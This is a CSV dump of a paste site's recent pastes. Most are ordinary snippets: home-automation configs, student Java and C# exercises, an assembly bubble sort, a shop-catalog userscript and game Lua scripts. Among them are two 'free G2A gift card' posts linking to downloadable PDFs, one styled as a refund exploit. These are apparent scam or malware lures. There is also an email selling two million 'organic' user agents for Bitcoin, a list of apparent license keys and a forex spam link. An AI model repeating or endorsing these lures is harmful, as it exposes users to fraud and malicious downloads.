id,title,username,language,date,content
DUzgTMtH,Temp,djgragra,YAML,Monday 15th of April 2024 01:02:54 PM CDT,"alias: ""TEST ""
description: """"
trigger:
  - platform: state
    entity_id:
      - sensor.sensore_bagno_temperature
condition: []
action:
  - if:
      - condition: numeric_state
        entity_id: sensor.sensore_bagno_temperature
        below: 10
    then:
      - service: light.turn_off
        metadata: {}
        data: {}
        target:
          entity_id: light.piantana
    else:
      - service: light.turn_on
        metadata: {}
        data: {}
        target:
          entity_id: light.piantana
mode: single"
pfFgSvKw,Untitled,Rodunskiy,C#,Monday 15th of April 2024 01:02:48 PM CDT,"int peopleInQueue;
int fixedTimeOnePeople = 10;
int timeInQueueHour;
int timeInQueueMin;
int hour = 60;

Console.WriteLine(""Введите кол-во людей в очереди."");
peopleInQueue = Convert.ToInt32(Console.ReadLine());

int totalTimeInQueue = fixedTimeOnePeople * peopleInQueue;

timeInQueueHour = totalTimeInQueue / hour;
timeInQueueMin = totalTimeInQueue % hour;

Console.WriteLine($""Вы должны отстоять в очереди {timeInQueueHour} часа и {timeInQueueMin} минут."");"
DyFCKtDA,openepaperlink med variabler,FlyHigh-Swe,JSON,Monday 15th of April 2024 12:54:19 PM CDT,"[{""id"":""f7933ee42bd95816"",""type"":""api-call-service"",""z"":""4346d7d500d95631"",""name"":"""",""server"":""a0ae687a.b44378"",""version"":5,""debugenabled"":true,""domain"":""open_epaper_link"",""service"":""lines4"",""areaId"":[],""deviceId"":[],""entityId"":[""open_epaper_link.000002393ad13b14"",""open_epaper_link.00002c5d4d0cdadc""],""data"":""{\t    \""line1\"":\""Framsida: \""  & framsida,\t    \""line2\"":\""waylongertext\"",\t    \""line3\"":\""Test Text\"",\t    \""line4\"":\""left\"",\t    \""border\"":\""r\"",\t    \""format1\"":\""mbbw\"",\t    \""format2\"":\""mwwb\"",\t    \""format3\"":\""mbbw\"",\t    \""format4\"":\""lrwb\""}"",""dataType"":""jsonata"",""mergeContext"":"""",""mustacheAltTags"":false,""outputProperties"":[{""property"":""payload"",""propertyType"":""msg"",""value"":"""",""valueType"":""data""},{""property"":""result"",""propertyType"":""msg"",""value"":"""",""valueType"":""results""}],""queue"":""none"",""x"":850,""y"":780,""wires"":[[""7437ee72fd9432f0""]]},{""id"":""ce9b62a9e21573ec"",""type"":""inject"",""z"":""4346d7d500d95631"",""name"":"""",""props"":[{""p"":""payload""},{""p"":""topic"",""vt"":""str""}],""repeat"":""3600"",""crontab"":"""",""once"":true,""onceDelay"":0.1,""topic"":"""",""payload"":"""",""payloadType"":""date"",""x"":90,""y"":780,""wires"":[[""c01de8a23cd7c43c""]]},{""id"":""7437ee72fd9432f0"",""type"":""debug"",""z"":""4346d7d500d95631"",""name"":""debug 94"",""active"":true,""tosidebar"":true,""console"":false,""tostatus"":false,""complete"":""true"",""targetType"":""full"",""statusVal"":"""",""statusType"":""auto"",""x"":1100,""y"":780,""wires"":[]},{""id"":""c01de8a23cd7c43c"",""type"":""api-current-state"",""z"":""4346d7d500d95631"",""name"":"""",""server"":""a0ae687a.b44378"",""version"":3,""outputs"":1,""halt_if"":"""",""halt_if_type"":""num"",""halt_if_compare"":""is"",""entity_id"":""sensor.framsida_termometer_temperature"",""state_type"":""str"",""blockInputOverrides"":false,""outputProperties"":[{""property"":""framsida"",""propertyType"":""msg"",""value"":"""",""valueType"":""entityState""},{""property"":""data"",""propertyType"":""msg"",""value"":"""",""valueType"":""entity""}],""for"":""0"",""forType"":""num"",""forUnits"":""minutes"",""override_topic"":false,""state_location"":""payload"",""override_payload"":""msg"",""entity_location"":""data"",""override_data"":""msg"",""x"":410,""y"":780,""wires"":[[""f7933ee42bd95816""]]},{""id"":""a0ae687a.b44378"",""type"":""server"",""name"":""Home Assistant"",""version"":5,""addon"":true,""rejectUnauthorizedCerts"":true,""ha_boolean"":""y|yes|true|on|home|open"",""connectionDelay"":true,""cacheJson"":true,""heartbeat"":false,""heartbeatInterval"":30,""areaSelector"":""friendlyName"",""deviceSelector"":""friendlyName"",""entitySelector"":""friendlyName"",""statusSeparator"":""at: "",""statusYear"":""hidden"",""statusMonth"":""short"",""statusDay"":""numeric"",""statusHourCycle"":""h23"",""statusTimeFormat"":""h:m"",""enableGlobalContextStore"":true}]"
KrRZqqkP,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,ssss50w,GetText,Monday 15th of April 2024 12:49:22 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
  
Working as of:
15 April 2024"
bxq57vCm,Product.java,NeverRIEght,Java,Monday 15th of April 2024 12:48:47 PM CDT,"class Product {
    //declare instance constants name and price
    private final String name;
    private final int price;

    //declare a parameterized constructor
    public Product(String name, int price) {
        this.name = name;
        this.price = price;
    }

    //declare getters
    public String getName() {
        return name;
    }

    public int getPrice() {
        return price;
    }

    //declare toString
    @Override
    public String toString() {
        return this.getClass().getSimpleName() + "" [name="" + name + "", price="" + price + ""]"";
    }
}

class Purchase {
    //declare instance constants product and number
    private final Product product;
    private final int number;

    //declare a parameterized constructor
    public Purchase(Product product, int number) {
        this.product = product;
        this.number = number;
    }

    //declare getters
    public Product getProduct() {
        return product;
    }

    public int getNumber() {
        return number;
    }

    //do not change signatures of methods
    protected int getFinalCost(int baseCost) {
        return baseCost;
    }

    public final int getCost() {
        //replace 0 by a product of price by number
        int baseCost = product.getPrice() * number;
        return getFinalCost(baseCost);
    }

    protected String fieldsToString() {
        //replace returned expression by Java code in the given format
        //return product and number
        return "" [product="" + product +
                "", number="" + number;
    }

    @Override
    public final String toString() {
        //replace returned expression by Java code in the given format
        //return class_name_part + fieldsToString() + getCost_part
        return this.getClass().getSimpleName() + fieldsToString() + "", getCost()="" + getCost() + ""]"";
    }

}

class TransportExpencesPurchase extends Purchase {
    //declare instance constant expences
    private final int expences;

    //declare a parameterized constructor
    public TransportExpencesPurchase(Product product, int number, int expences) {
        super(product, number);
        this.expences = expences;
    }

    //do not change signatures of methods
    @Override
    protected int getFinalCost(int baseCost) {
        //put your code here
        return baseCost + expences;
    }

    @Override
    protected String fieldsToString() {
        //put your code here
        return super.fieldsToString() +
                "", expences="" + expences;
    }
}

class PriceDiscountPurchase extends Purchase {
    //declare instance constant discount
    private final int discount;

    //declare a parameterized constructor
    public PriceDiscountPurchase(Product product, int number, int discount) {
        super(product, number);
        this.discount = discount;
    }

    //do not change signatures of methods
    @Override
    protected int getFinalCost(int baseCost) {
        //put your code here
        return baseCost - discount * getNumber();
    }

    @Override
    protected String fieldsToString() {
        //put your code here
        return super.fieldsToString() +
                "", discount="" + discount;
    }
}

class WholesalePurchase extends Purchase {
    //declare instance constant percent and class constant LIMIT
    private final double percent;
    private static final int LIMIT = 20;

    //declare a parameterized constructor
    public WholesalePurchase(Product product, int number, double percent) {
        super(product, number);
        this.percent = percent;
    }

    //do not change signatures of methods
    @Override
    protected int getFinalCost(int baseCost) {
        //put your code here
        if (getNumber() >= 20) {
            return (int) Math.round(baseCost * (1 - percent / 100));
        }
        return baseCost;
    }

    @Override
    protected String fieldsToString() {
        //put your code here
        return super.fieldsToString() +
                "", percent="" + percent;
    }
}"
wpeyBh8k,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Monday 15th of April 2024 12:44:13 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_240365.pdf

Working as of:
15 April 2024"
DqSnUjbL,Untitled,Rodunskiy,C#,Monday 15th of April 2024 12:38:40 PM CDT,"int peopleInQueue;
int fixedTimeOnePeople = 10;
int timeInQueueHour;
int timeInQueueMin;
int hour = 60;

Console.WriteLine(""Введите кол-во людей в очереди."");
peopleInQueue = Convert.ToInt32(Console.ReadLine());

timeInQueueHour = (fixedTimeOnePeople * peopleInQueue) / hour;
timeInQueueMin = (fixedTimeOnePeople * peopleInQueue) % hour;

Console.WriteLine($""Вы должны отстоять в очереди {timeInQueueHour} часа и {timeInQueueMin} минут."");"
kzLDu20t,Untitled,dllbridge,C,Monday 15th of April 2024 12:16:43 PM CDT,"

#include <stdio.h>


int  sort (int *, int  ); 
void swap (int &, int &);
void print(int *, int  );

extern ""C"" {
 
    void  __stdcall _swap(  int *, int * );   
    int   __stdcall _sort(  int *, int   );       
}


////////////////////////////////////////////////////////
int main()                                            //
{

	int mas[99] = {5, 11, 2, 1117, 6, 34, 91, 1, 7},
	
          n     = _sort (mas, 9);	
    
    printf(""Number of permutations = %d \n"", n);
    
	print(mas, 9);

return 0;
}


//  stdcall-функция может как угодно менять eax, ecx и edx,
//  не восстанавливая их потом. 
// - - - - - - - - - - - - - - - - 
//   1)  swap - Функция
//   2)  Используем аналогию: по одному торту в каждой руке.
//       Чтобы их поменять местами, потребуется стол.
//        
//  10)  Кол-во перестановок узнаём.


////////////////////////////////////////////////////////
void swap(int &n1, int &n2)                           //
{
	
	 int n3 = n1;
	 
	     n1 = n2;
	     n2 = n3;
}


////////////////////////////////////////////////////////
int  sort(int *p, int n)                              // 
{
	
	    int nF, nCount = 0;                                       //  Флаг  
	 
L_01:	    nF = 0;             
	
			for(int i = 0; i < n-1; i++)
			{
															
				if( p[i] > p[i+1] ) { nF = 1;       //  = 1, если требуется перестановка  
				                      nCount ++; 
				                    //  swap( p[i],  p[i+1] ); }
									 _swap(  &p[i], &p[i+1] ); }	
			}
			
			if(nF) goto L_01;
			  
return nCount;			  
}



////////////////////////////////////////////////////////
void print(int *p, int n)                             // 
{
	
	 for(int i = 0; i < n; i++) {
	                              printf(""%d, "", p[i]);
	 }
	 
	 printf(""\n"");
}











// Пузырьковая сортировка на Си — это метод сортировки данных, который 
// работает путём сравнения соседних элементов и обмена их местами, 
// если необходимо. Алгоритм состоит из нескольких проходов по массиву, 
// каждый из которых улучшает порядок элементов.

//  FASM :
include    'win32a.inc'




format      MS COFF




public     _sort                    as '__sort@8'
public     _swap                    as '__swap@8'



section   '.text' code readable executable


;      Передаём указатели на элементы массива, которые следует
;                                             поменять местами.
;/////////////////////////////////////////////////////////////
proc   _swap   p1, p2                                      ;//


        mov  esi ,  [ p1]
        mov  eax ,  [esi]
        mov  edi ,  [ p2]
        mov  edx ,  [edi]
        mov [esi],   edx
        mov [edi],   eax

        ret
endp

;  Специально для функции sort, чтобы упростить создание кода.
;                         В p адрес младшего из 2-х элементов
;////////////////////////////////////////////////////////////
proc    swap   p                                          ;//

        push esi
        push edi

       ; - - - - - - - - -
        mov  esi ,  [ p ]             ; Адрес 1-го торта
        mov  edi ,  [ p ]
        add  edi ,     4              ; Адрес 2-го торта
        mov  eax ,  [esi]             ; 1-й торт в левую руку   (в eax)

        cmp  eax ,  [edi]             ; Сравним 2 торта

        jle  L_01                     ; Если содержимое eax < ,то выходим

        mov  edx , [edi]              ; edx, как стол используем
        mov [esi],  edx
        mov [edi],  eax
        mov [ nF],    1               ; Флаг помнит про перестановку
        inc [nCount]                  ; Счётчик перестановок увеличиваем
       ; - - - - - - - - -

L_01:   pop  edi
        pop  esi
        ret
endp







;  stdcall-функция может как угодно менять eax, ecx и edx,
;  не восстанавливая их потом.
;/////////////////////////////////////////////////////////////
proc   _sort   p, n                                        ;//

        dec   [n]


L_05:   mov   esi ,  [p]
        mov   ecx ,  [n]                                       ; число итераций
        mov  [ nF],    0

L_02:   push  esi

        call swap
        add   esi ,    4

        loop L_02                                          ; Команда цикла, переход на новый

        cmp   [nF],    1
        jz   L_05
        mov   eax , [nCount]
ret

endp







section '.data' data readable writeable
;-------------------------------------------------------------     Создание переменных:
   arr     dd   4 dup(333)
   nF      dd   0
   nCount  dd   0

            "
3z32kvGe,ConvertNumberToText,andresnogales,Java,Monday 15th of April 2024 12:12:18 PM CDT,"public with sharing class ConvertNumberToText {
    public ConvertNumberToText() {
    }

    private static final List<String> tensNames = new List<String>{
        '',
        ' ten',
        ' twenty',
        ' thirty',
        ' forty',
        ' fifty',
        ' sixty',
        ' seventy',
        ' eighty',
        ' ninety'
    };

    private static final List<String> numNames = new List<String>{
        '',
        ' one',
        ' two',
        ' three',
        ' four',
        ' five',
        ' six',
        ' seven',
        ' eight',
        ' nine',
        ' ten',
        ' eleven',
        ' twelve',
        ' thirteen',
        ' fourteen',
        ' fifteen',
        ' sixteen',
        ' seventeen',
        ' eighteen',
        ' nineteen'
    };

    private static String convertLessThanOneThousand(Integer numberValue) {
        String soFar;

        if (Math.mod(numberValue, 100) < 20) {
            soFar = numNames[Math.mod(numberValue, 100)];
            numberValue = numberValue / 100;
        } else {
            soFar = numNames[Math.mod(numberValue, 10)];
            numberValue = numberValue / 10;

            soFar = tensNames[Math.mod(numberValue, 10)] + soFar;
            numberValue = numberValue / 10;
        }
        if (numberValue == 0)
            return soFar;
        return numNames[numberValue] + ' hundred' + soFar;
    }

    public static String convert(Long numberValue) {
        // 0 to 999 999 999 999
        if (numberValue == 0) {
            return 'zero';
        }
        String snumber = String.valueOf(numberValue);

        // Pad with ""0""
        String mask = '000000000000';
        while (snumber.length() < mask.length()) {
            snumber = '0' + snumber;
        }

        // XXXnnnnnnnnn
        Integer billions = Integer.valueOf(snumber.substring(0, 3));
        // nnnXXXnnnnnn
        Integer millions = Integer.valueOf(snumber.substring(3, 6));
        // nnnnnnXXXnnn
        Integer hundredThousands = Integer.valueOf(snumber.substring(6, 9));
        // nnnnnnnnnXXX
        Integer thousands = Integer.valueOf(snumber.substring(9, 12));

        String tradBillions;
        switch on (billions) {
            when 0 {
                tradBillions = '';
            }
            when 1 {
                tradBillions =
                    convertLessThanOneThousand(billions) + ' billion ';
            }
            when else {
                tradBillions =
                    convertLessThanOneThousand(billions) + ' billion ';
            }
        }
        String result = tradBillions;

        String tradMillions;
        switch on (millions) {
            when 0 {
                tradMillions = '';
            }
            when 1 {
                tradMillions =
                    convertLessThanOneThousand(millions) + ' million ';
            }
            when else {
                tradMillions =
                    convertLessThanOneThousand(millions) + ' million ';
            }
        }
        result = result + tradMillions;

        String tradHundredThousands;
        switch on (hundredThousands) {
            when 0 {
                tradHundredThousands = '';
            }
            when 1 {
                tradHundredThousands = 'one thousand ';
            }
            when else {
                tradHundredThousands =
                    convertLessThanOneThousand(hundredThousands) + ' thousand ';
            }
        }
        result = result + tradHundredThousands;

        String tradThousand;
        tradThousand = convertLessThanOneThousand(thousands);
        result = result + tradThousand;

        // remove extra spaces!
        return result.replaceAll('^\\s+', '').replaceAll('\\b\\s{2,}\\b', ' ');
    }

    /*
    String phrase = '12345.67';
    Decimal num = Decimal.valueOf(phrase);
    Integer dollars = num.intValue();
    Integer cent = Integer.valueOf((num - dollars) * 100);

    String s = '$ ' + ConvertNumberToText.convert(dollars) + ' and '
            + ConvertNumberToText.convert(cent) + ' cents';
    System.debug(s);
    */
}
"
yTFQaSSz,Untitled,DaniDori,CSS,Monday 15th of April 2024 11:55:08 AM CDT,"input[type=""number""]::-webkit-outer-spin-button,
input[type=""number""]::-webkit-inner-spin-button {
    -webkit-appearance: none; // Yeah, yeah everybody write about it
}

input[type='number'],
input[type=""number""]:hover,
input[type=""number""]:focus {
    appearance: none;
    -moz-appearance: textfield;
}

.igra-btn {
  background-color: #4CAF50; /* Зеленый цвет */
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  position: fixed;
  right: 100px;
  top: 100px;
  z-index: 9999;
  border-radius: 8px;
  height: 50px;
}

.igra-btn-percent {
  background-color: #42aaff; /* Голубой цвет */
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  position: fixed;
  right: 550px;
  top: 100px;
  z-index: 9999;
  border-radius: 8px;
  height: 50px;
}

.igra-btn-display {
  background-color: #ff0000; /* Красный цвет */
  border: none;
  color: white;
  padding: 4px 4px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  position: fixed;
  left: 30px;
  top: 30px;
  z-index: 9999;
  border-radius: 8px;
  height: 24px;
  width: 24px;
}

.igra-input {
  border: none;
  background-color: #4CAF50;
  color: white;
  outline: #9ee7a1 ;
  position: fixed;
  right: 250px;
  top: 100px;
  z-index: 9999;
  border-radius: 8px;
  height: 50px;
  padding: 15px 32px;
  font-size: 16px;
  width: 250px;
}

.item-profit {
  font-size: 16px;
  z-index: 9999;
  color: #4CAF50;
  padding-left: 10px;
}

.d-n {
  display: none;
}

.promo-input {
  border: none;
  background-color: #555;
  color: white;
  outline: #9ee7a1 ;
  position: fixed;
  top: 50px;
  z-index: 9999;
  border-radius: 8px;
  height: 50px;
  padding: 15px 32px;
  font-size: 12px;
  width: 250px;
  right: 250px;
}
"
ZTPUp7hq,Untitled,DaniDori,JavaScript,Monday 15th of April 2024 11:54:21 AM CDT,"(function () {
  ""use strict"";

  let phonePrice = 23000;

  const igraBtn = document.createElement(""button"");
  const igraPercentageBtn = document.createElement(""button"");
  const igraDisplayBtn = document.createElement(""button"");
  const igraInput = document.createElement(""input"");
  const promoInput = document.createElement(""input"");
  
  
  
  igraDisplayBtn.classList.add(""igra-btn-display"");
  igraDisplayBtn.textContent = ""X"";
  
  //обработка кнопки крестик
  igraDisplayBtn.addEventListener(""click"", () => {
    igraBtn.classList.toggle('d-n');
    igraPercentageBtn.classList.toggle('d-n');
    igraInput.classList.toggle('d-n');
    promoInput.classList.toggle('d-n');
  });
 //обработка кнопки Посчитать
  igraBtn.textContent = ""Посчитать"";
  igraBtn.classList.add(""igra-btn"");
  igraBtn.addEventListener(""click"", () => {
    phonePrice = Number(igraInput.value);
    igraSortCatalog();
  });
   //обработка кнопки сортировать
  igraPercentageBtn.textContent = ""Сортировать"";
  igraPercentageBtn.classList.add(""igra-btn-percent"");
  igraPercentageBtn.addEventListener(""click"", () => {
    phonePrice = Number(igraInput.value);
    igraSortPercentage();
  });

  
 //обработка поля ввода цены
  igraInput.type = ""number"";
  igraInput.classList.add(""igra-input"");
  igraInput.value = phonePrice;
  igraInput.addEventListener(""input"", () => {
    igraInput.value = igraInput.value.replace(/[^0-9]/g, """");
    phonePrice = Number(igraInput.value);
  });
  
  
  let igraPromoString = ''
  let promoArr = [];
   //обработка поля ввода промокода
  //promoInput.type = ""string"";
  promoInput.classList.add(""promo-input"");
  promoInput.value = `cats  20000  70000  7000
  dogs  7000  60000  6000
  cows  3000  15000  5500
  eagles  21000  105000  7500`;
  promoInput.addEventListener(""input"", () => {
   // очищаем массив перед каждым новым заполнением
   igraPromoString=promoInput.value.split(/\s+/)
		for (let i=0; i<igraPromoString.length; i+=4) {
		  let promoName = igraPromoString[i];
		  let discont = +igraPromoString[i+1];
		  let minSum = +igraPromoString[i+2]
		  let promoPrice = +igraPromoString[i+3]
		  promoArr.push([promoName, discont, minSum, promoPrice])
		}
});

  

  setTimeout(() => {
    const igraBody = document.body;
    igraBody.appendChild(igraDisplayBtn);
    igraBody.appendChild(igraPercentageBtn);
    igraBody.appendChild(igraBtn);
    igraBody.appendChild(igraInput);
    igraBody.appendChild(promoInput);
  }, 1000);

  let igraCards = [];

  function getIgraCards() {
    return (igraCards = Array.from(document.querySelectorAll("".catalog-item"")));
  }

  function mapIgraCards() {
    igraCards = getIgraCards();
    igraCards.forEach((card) => {
      if (card.querySelector("".item-price"")) {
        const igraItemPrice = igraConvertToNumber(
          card.querySelector("".item-price"").textContent
        );
        const igraItemBonus = igraConvertToNumber(
          card.querySelector("".bonus-amount"").textContent
        );
        const igraItemMoney = card.querySelector("".item-money"");

        const igraItemProfit = document.createElement(""div"");
        igraItemProfit.classList.add(""item-profit"");
        igraItemProfit.textContent = igraGetProfitPrice(
          igraItemPrice,
          igraItemBonus
        ) + '\n' + promoWorkHard(igraItemPrice, igraItemBonus, promoArr, phonePrice);
        
        if (igraItemMoney.querySelector("".item-profit"")) {
          igraItemMoney.querySelector("".item-profit"").remove();
        }
        igraItemMoney.append(igraItemProfit);
      }
    });
  }

  function igraConvertToNumber(str) {
    // Удаляем все пробелы из строки
    let stringWithoutSpaces = str.replace(/ /g, """");

    // Удаляем знак рубля, если есть
    let stringWithoutCurrencySign = stringWithoutSpaces.replace(""₽"", """");

    // Преобразуем строку в число
    let number = parseFloat(stringWithoutCurrencySign);

    // Возвращаем число
    return number;
  }

  function igraGetProfitPrice(price, bonus) {
    let a = price - bonus;
    let b = phonePrice - a;
    let c = (phonePrice - price + 0.8 * bonus) * 100 / price
    return c.toFixed(2);
  }

  function igraSortCatalog() {
    mapIgraCards();
    let igraSortedCards = sortDivByPrice(getIgraCards());

    const igraCatalogItems = document.querySelector("".catalog-listing__items"");
    igraCatalogItems.innerHTML = """";
    igraSortedCards.map((card) => {
      igraCatalogItems.append(card);
    });
  }
  
  function igraSortPercentage() {
    mapIgraCards();
    let igraSortedCards = sortDivByPricePercentage(getIgraCards());
    console.log(igraSortedCards)

    const igraCatalogItems = document.querySelector("".catalog-items-list"");
    igraCatalogItems.innerHTML = """";
    igraSortedCards.map((card) => {
      igraCatalogItems.append(card);
    });
  }
	
	//функция подсчета промокода
	function promoWorkHard(phonePrice, bonusNum, promoArr, igraPrice){
		let bestRoi = 0, bestPromoName = """";
		let RoiMin = 0, RoiMax = 0
		let bestPhoneCount = 0, totalPriceMin = 0, totalPriceMax = 0, bonusPercent = 0;
		let totalBonus = 0;
		for (let i = 0; i < promoArr.length; i++){
			let promoName = promoArr[i][0], discont = promoArr[i][1];
			let minSum = promoArr[i][2], promoPrice= promoArr[i][3];
			
		  let kMax = Math.ceil(minSum / phonePrice);
		  let kMin = Math.floor(minSum / phonePrice);
		  
		  let totalPriceMax = phonePrice * kMax;
		  let totalPriceMin = phonePrice * kMin;
		  bonusPercent = bonusNum / phonePrice; 
		  let totalBonusMax = (totalPriceMax - discont) * bonusPercent * 0.8
		  let totalBonusMin = (totalPriceMin - discont) * bonusPercent * 0.8
		  
		  RoiMax = (igraPrice * kMax - totalPriceMax + totalBonusMax + promoPrice) / (totalPriceMax + promoPrice)
		  RoiMin = (igraPrice * kMin - totalPriceMin + totalBonusMin + promoPrice) / (totalPriceMin + promoPrice)
		  
		  if(RoiMin > bestRoi){
		    bestRoi = RoiMin
		    bestPhoneCount = kMin
		    bestPromoName = promoName
		  }
		  if(RoiMax > bestRoi){
		    bestRoi = RoiMax
		    bestPhoneCount = kMax
		    bestPromoName = promoName
		  }
		}
		 return `${bestPromoName}, ${bestPhoneCount}, ${bestRoi.toFixed(2)}`;
	}
	
  function sortPrices(arr) {
    const prices = arr.map((div) => {
      const itemProfit = div.querySelector("".item-profit"");
      const price = itemProfit.textContent;
      return parseInt(price);
    });
    prices.sort((a, b) => b - a);
    return prices;
  }
  function sortDivByPrice(arr) {
    const sortedArr = arr.sort((a, b) => {
      if (a.querySelector("".item-profit"")) {
        const priceA = Number(a.querySelector("".item-profit"").textContent);
        const priceB = Number(b.querySelector("".item-profit"").textContent);
return priceB - priceA;
      }
    });
    return sortedArr;
  }
  
    function sortDivByPricePercentage(arr) {
    const sortedArr = arr.sort((a, b) => {
      if (a.querySelector("".bonus-percent"")) {
        const priceA = Number(igraMyGeeks(a.querySelector("".bonus-percent"").textContent));
        const priceB = Number(igraMyGeeks(b.querySelector("".bonus-percent"").textContent));

        return priceB - priceA;
      }
    });

    return sortedArr;
  }
  
  function igraMyGeeks(string) {
 
    // Input string
    let str = string;
 
    // Using match with regEx
    let matches = str.match(/(\d+)/);
     
    // Display output if number extracted
    if (matches) {
        return matches[0];
    }
}
})();"
JU3Hxrma,1.6b,Shiko5303,Lua,Monday 15th of April 2024 11:41:52 AM CDT,"gg.alert[[
⠀⠀⠀⣀⣾⡿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢀⣠⣶⣾⢿⣿⣳⣦⡀⠀⠀⠀⠀⣶⡶⣶⣶⠀⠀⠀⠀⠀⠀⠀
⣠⣤⣾⢿⣽⣻⣽⠇⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣟⣷⡻⠏⠱⠿⠳⠟⠆⠀⠀⠀⣿⣽⢷⣻⠀⣀⣀⡀⠀⠀⠀
⣿⣟⣾⡟⣷⣻⡽⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⣟⣾⣽⣧⣶⡶⣶⢦⡀⠀⠀⠀⠀⣿⢾⣻⣟⡿⣯⡿⣽⡷⣆⠀
⠉⠀⠀⠀⣿⢯⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀⢸⣟⡾⣷⡟⠇⠛⣯⣿⣻⠆⠀⠀⠀⣿⣻⣽⣾⠛⠉⢹⣷⣟⡿⡄
⠀⠀⠀⠀⣿⡿⣷⠇⠀⠀⠀⣀⣀⣀⡀⠀⢸⣏⣿⣷⡇⠀⠀⣿⢷⣿⡇⠀⠀⠀⣿⣹⢷⣿⠀⠀⢸⡿⣾⡿⠇
⠀⠀⠀⠀⣿⣽⣟⡇⠀⠀⠀⣿⢯⣟⡧⠀⠀⢻⣾⣳⣧⢦⣶⣟⣯⡷⠃⠀⠀⠀⣿⡽⣿⣽⣳⣦⡾⣿⣽⡻⠃
⠀⠀⠀⠀⠛⠓⠛⠂⠀⠀⠀⠛⠛⠙⠃⠀⠀⠀⠈⠛⠞⠛⠓⠏⠋⠁⠀⠀⠀⠀⠻⠽⠻⠮⠙⠷⠿⠳⠟⠁⠀
]]"
EEuuinx1,Win Exciting Prizes : Participate in the Vittaverse Forex Trading Contest,reviewbrokers,PHP,Monday 15th of April 2024 11:41:50 AM CDT,https://www.reviewbrokers.net/win-exciting-prizes-participate-in-the-vittaverse-forex-trading-contest/
sbQdvg72,Untitled,Nil000,Email,Monday 15th of April 2024 11:39:39 AM CDT,"email: geralddemail@gmail.com
---------
Hello!

I am contacting you about an interesting sale proposal!

I have in my possession, two million, real, organic, user agents. They are very rare and support a variety of apps and websites.

If you ever need more, I will try my best to provide you with similar user agents.

The price for the whole 2 million user agents pack is $2,000, though it can be negotiated.

The only payment method I accept is Bitcoin.

Sincerely, Gerald."
QXAS2Afp,crafter-dustseeds.lua,Inlife,Lua,Monday 15th of April 2024 11:28:44 AM CDT,"local CRAFT_BATCH_SIZE = 16;
local CRAFT_SLEEP_WAIT = 2;

local craftTable = {
    {""f"", ""t"", 0, 0},
    {0, 0, 0, 0},
    {0, 0, 0, 0},
    {0, 0, 0, 0}
}

function cleanUpInventory()
    print(""[cr] cleaning up the inventory"")
    for i=1,16 do
        turtle.select(i)
        turtle.dropDown()
    end
end

function loadIngridient(slot, direction)
    if direction == 0 then
        return
    end

    print(""[cr] loading item to slot "" .. slot)
    turtle.select(slot)

    local res
    local count = turtle.getItemCount()

    if direction == ""t"" then
        res = turtle.suckUp(CRAFT_BATCH_SIZE - count)
    elseif direction == ""b"" then
        res = turtle.suckDown(CRAFT_BATCH_SIZE - count)
    elseif direction == ""f"" then
        res = turtle.suck(CRAFT_BATCH_SIZE - count)
    end

    if not res then
        print(""[cr] could not get items to the slot, waiting and trying again..."")
        sleep(CRAFT_SLEEP_WAIT)
        return loadIngridient(slot, direction)
    end

    if turtle.getItemCount() < CRAFT_BATCH_SIZE then
        print(""[cr] loaded less items then expected, waiting to try fill up fully..."")
        sleep(CRAFT_SLEEP_WAIT)
        return loadIngridient(slot, direction)
    end
end

function iterate()
    print(""[cr] getting ingredients"")
    for i,row in ipairs(craftTable) do
        for j,col in ipairs(row) do
            print(""[cr] loading into slot "" .. j .. ';' .. i);
            loadIngridient(i*4+j, col)
        end
    end

    print(""[cr] crafting"")
    turtle.select(1)
    turtle.craft()

    print(""[cr] pooping out results ..."")
    while turtle.getItemCount() > 0 do
        sleep(CRAFT_SLEEP_WAIT)
    end
end

function main()
    print(""\n\n-------------------------------"")
    print(""[cr] starting the program; v1.0"")
    print(""-------------------------------\n\n"");
    cleanUpInventory()

    while true do
        iterate()
    end
end

main()"
MaGqpJNt,ZP Checker 2024,softupdate,PHP,Monday 15th of April 2024 11:04:10 AM CDT,"--------------ZP Checker------------
BB06-DBEB-2021-BB06-BB0D66BB0653 me
D72C-452D-2021-D72C-483B13D72CF9 15-04-2024 *** 2months"
MfyrC3Bt,returns a wrong normal,AlewAlow,Lua,Monday 15th of April 2024 10:53:03 AM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local UserInputService = game:GetService(""UserInputService"")

local Matter = require(ReplicatedStorage.Shared.Libs.Matter)
local Components = require(ReplicatedStorage.Shared.Components)
local Constants = require(ReplicatedStorage.Shared.Constants)

local GetEntityGlobalScale = require(ReplicatedStorage.Shared.Utils.GetEntityGlobalScale)
local GetEntityGlobalPosition = require(ReplicatedStorage.Shared.Utils.GetEntityGlobalPosition)
local GetEntityDescendants = require(ReplicatedStorage.Shared.Utils.GetEntityDescendants)

local function FireShapecast(origin, direction, size, entities, world)
	if type(entities) == ""number"" then
		entities = GetEntityDescendants(entities, world)
	end
	
	local closestHit = nil
	local closestTime = math.huge
	local closestNormal = Vector2.new()
	local closestPosition = Vector2.new()

	local invDirection = 1 / direction

	for _, id in pairs(entities) do
		local transform = world:get(id, Components.Transform)
		if not transform then
			continue
		end

		local collider = world:get(id, Components.Collider)
		if not collider then
			continue
		end

		local globalPosition = GetEntityGlobalPosition(id, world)
		local globalSize = GetEntityGlobalScale(id, world) * collider.Size

		local topleft = globalPosition - globalSize / 2
		local botright = globalPosition + globalSize / 2

		local tEnter = (topleft - origin) * invDirection
